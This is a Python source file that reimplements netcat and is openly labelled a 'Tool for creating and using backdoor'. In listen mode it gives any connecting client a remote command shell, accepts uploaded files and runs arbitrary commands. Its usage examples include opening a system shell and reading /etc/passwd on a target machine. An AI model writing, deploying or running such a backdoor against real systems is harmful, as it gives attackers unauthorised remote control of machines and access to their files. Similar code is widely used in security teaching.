import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
import os

# Executing command method
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    try:
        output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
        return output.decode()
    except OSError as err:
        os.chdir(shlex.split(cmd)[1])
        output = str(f'Directory has been changed to: {shlex.split(cmd)[1]}')
        return output

# NetCat object definition and methods
class NetCat:
    def __init__ (self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Running proper methods depending on mode of operation
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
#----------------------------------------------------------------------------------
# Sender mode method
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ''
# Receiving answer from target - if empty then break the loop
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
# Printing response and stopping until new commands are written
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
# Connection is closing when ctrl+c is pressed
        except KeyboardInterrupt:
            print('Operation aborted by the user')
            self.socket.close()
            sys.exit()
#----------------------------------------------------------------------------------
# Listener mode method        
    def listen(self):
        print('Listening')
# Creating listening socket and starting listening
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
# Starting handle method for every incoming connection on separate thread
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()
#----------------------------------------------------------------------------------
# Handling connections accoring to argument
    def handle(self, client_socket):
# Recall to global execute method when there is command to be executed
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
#----------------------------------------------------------------------------------
# Uploading file method
        elif self.args.upload:
            file_buffer = b''
# Gathering file's data loop
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
# Saving file on target
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
#----------------------------------------------------------------------------------
# Opening shell method
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b' #> ')
# New line character indicates the end of command
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
# Inserted command is executed within the execute method and response is sent back to sender
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server has been stopped: {e}')
                    self.socket.close()
                    sys.exit()    
#----------------------------------------------------------------------------------
# CLI arguments declaration
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Tool for creating and using backdoor',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Examples:
            Netcat.py -t 192.168.1.108 -p 5555 -l -c # Open system shell
            Netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.whatisup # Upload file
            Netcat.py -t 192.168.1.108 -p -l -e=\"cat /etc/passwd\" # Execute command
            echo 'ABCDEFGHI' | ./Netcat.py 192.168.1.108 p- 135 # Send text to the server on port 135
            Netcat.py -t 192.168.1.108 -p 5555 # Connect to server'''))
    parser.add_argument('-c', '--command', action='store_true', help='opening shell')
    parser.add_argument('-e', '--execute', help='executing command')
    parser.add_argument('-l', '--listen', action='store_true', help='listening')
    parser.add_argument('-p', '--port', type=int, default=5555, help='target port')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='target IP adress')
    parser.add_argument('-u', '--upload', help='uploading file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
# Creating NetCat object with given arguments and anything else
    nc = NetCat(args,buffer.encode('utf-8'))
    nc.run()
